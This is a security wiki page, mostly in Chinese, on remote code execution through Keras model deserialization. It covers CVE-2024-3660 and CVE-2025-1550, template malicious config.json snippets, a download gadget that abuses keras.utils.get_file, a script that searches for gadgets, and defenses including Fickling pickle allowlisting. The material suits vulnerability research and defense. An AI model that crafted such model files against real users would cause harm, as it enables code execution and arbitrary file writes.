# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

本页总结了针对 Keras model deserialization 管道的实用利用技术，解释了原生 .keras 格式的内部结构和攻击面，并为研究人员提供用于查找 Model File Vulnerabilities (MFVs) 和 post-fix gadgets 的工具包。

## .keras model 格式内部

A .keras 文件是一个 ZIP 压缩包，至少包含：
- metadata.json – 通用信息（例如，Keras 版本）
- config.json – 模型架构（主要的攻击面）
- model.weights.h5 – 以 HDF5 存储的 weights

config.json 驱动递归 deserialization：Keras 导入模块，解析 classes/functions，并从由攻击者控制的 dictionaries 中重建 layers/objects。

Example snippet for a Dense layer object:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization 执行：
- 从 module/class_name 键导入模块并解析符号
- 使用攻击者控制的 kwargs 调用 from_config(...) 或构造函数
- 递归进入嵌套对象（activations、initializers、constraints 等）

历史上，这向构造 config.json 的攻击者暴露了三种原语：
- 控制导入哪些 modules
- 控制解析哪些 classes/functions
- 控制传入 constructors/from_config 的 kwargs

## CVE-2024-3660 – Lambda-layer bytecode RCE

Root cause:
- Lambda.from_config() 使用 python_utils.func_load(...)，该函数对攻击者的字节进行 base64-decodes 并调用 marshal.loads()；Python unmarshalling 可能会执行代码。

Exploit idea (simplified payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
缓解:
- Keras enforces safe_mode=True by default. Serialized Python functions in Lambda are blocked unless a user explicitly opts out with safe_mode=False.

Notes:
- Legacy formats (older HDF5 saves) or older codebases may not enforce modern checks, so “downgrade” style attacks can still apply when victims use older loaders.

## CVE-2025-1550 – Keras ≤ 3.8 中的任意模块导入

根本原因:
- _retrieve_class_or_fn used unrestricted importlib.import_module() with attacker-controlled module strings from config.json.
- 影响: 可以任意导入任何已安装的模块（或攻击者放置在 sys.path 上的模块）。导入时的代码会执行，然后以攻击者的 kwargs 构造对象。

利用思路:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Security improvements (Keras ≥ 3.9):
- Module allowlist: imports restricted to official ecosystem modules: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True blocks unsafe Lambda serialized-function loading
- Basic type checking: deserialized objects must match expected types

## 允许列表内的后置 gadget 攻击面

即使启用了 allowlisting 和 safe mode，在被允许的 Keras 可调用对象中仍然存在广泛的攻击面。例如，keras.utils.get_file 可以将任意 URLs 下载到用户可选择的位置。

通过引用被允许函数的 Lambda 的 gadget（不是序列化的 Python bytecode）：
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
重要限制:
- Lambda.call() 在调用目标可调用对象时会将输入张量预置为第一个位置参数。所选的 gadgets 必须能容忍额外的位置参数（或接受 *args/**kwargs）。这会限制哪些函数可行。

Potential impacts of allowlisted gadgets:
- 任意下载/写入（path planting, config poisoning）
- 网络回调/取决于环境的 SSRF-like 效果
- 如果写入的路径随后被导入/执行或被添加到 PYTHONPATH，或存在可写的 execution-on-write 位置，则可能链式导致代码执行

## Researcher toolkit

1) Systematic gadget discovery in allowed modules

枚举 keras、keras_nlp、keras_cv、keras_hub 中的候选可调用对象，并优先考虑那些具有文件/网络/进程/环境 副作用的对象。
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) 直接反序列化测试 (no .keras archive needed)

将精心构造的 dicts 直接输入到 Keras deserializers 中，以了解被接受的 params 并观察副作用。
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) 跨版本探测与格式

Keras 存在于多个代码库/时代，具有不同的保护措施和格式：
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, slated for deletion)
- tf-keras: maintained separately
- Multi-backend Keras 3 (official): introduced native .keras

在不同代码库和格式之间重复测试（.keras vs legacy HDF5），以发现回归或缺失的防护。

## 防御建议

- 将模型文件视为不受信任的输入。仅从受信任的来源加载模型。
- 保持 Keras 最新；使用 Keras ≥ 3.9 以受益于允许列表和类型检查。
- 除非完全信任文件，否则不要在加载模型时将 safe_mode=False。
- 考虑在沙箱化、最小权限的环境中运行反序列化，禁止网络出站并限制文件系统访问。
- 在可能的情况下，对模型来源实施允许列表/签名和完整性校验。

## 针对 AI/ML 模型的 ML pickle 导入允许列表 (Fickling)

许多 AI/ML 模型格式（PyTorch .pt/.pth/.ckpt、joblib/scikit-learn、较旧的 TensorFlow 工件等）嵌入 Python pickle 数据。攻击者经常滥用 pickle GLOBAL imports 和对象构造器来在加载时实现 RCE 或模型替换。基于黑名单的扫描器往往会漏掉新出现的或未列入名单的危险导入。

一种实用的失败封闭(fail-closed)防御是 hook Python 的 pickle 反序列化器，并在反序列化期间仅允许一组经审查的无害 ML 相关导入。Trail of Bits 的 Fickling 实现了这一策略，并随附了一个从数千个公开 Hugging Face pickle 构建的精选 ML 导入允许列表。

“安全”导入的安全模型（基于研究和实践的直觉精炼）：pickle 使用的导入符号必须同时满足：
- 不执行代码或导致执行（无编译/源代码对象、调用外部命令、hooks 等）
- 不获取/设置任意属性或项
- 不从 pickle VM 导入或获取对其他 Python 对象的引用
- 不触发任何次级反序列化器（例如 marshal、嵌套的 pickle），即便是间接触发

尽早在进程启动时启用 Fickling 的保护，以便框架（torch.load、joblib.load 等）执行的任何 pickle 加载都会被检查：
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
操作提示：
- 您可以在需要时临时禁用/重新启用这些 hooks：
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- 如果已知良好的模型被阻止，在审查符号后为你的环境扩展 allowlist：
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling 还提供通用的运行时防护，如果你需要更细粒度的控制：
- fickling.always_check_safety() 用于对所有 pickle.load() 强制执行检查
- with fickling.check_safety(): 用于在作用域内强制检查
- fickling.load(path) / fickling.is_likely_safe(path) 用于一次性检查

- 尽量优先使用非-pickle 的模型格式（例如，SafeTensors）。如果必须接受 pickle，请在最小权限下运行加载器，禁止网络出口并强制执行 allowlist。

这一以 allowlist 为先的策略已被证明能阻止常见的 ML pickle 利用路径，同时保持很高的兼容性。在 ToB 的基准测试中，Fickling 标记了 100% 的合成恶意文件，并允许了来自顶级 Hugging Face 仓库约 99% 的干净文件。

## References

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
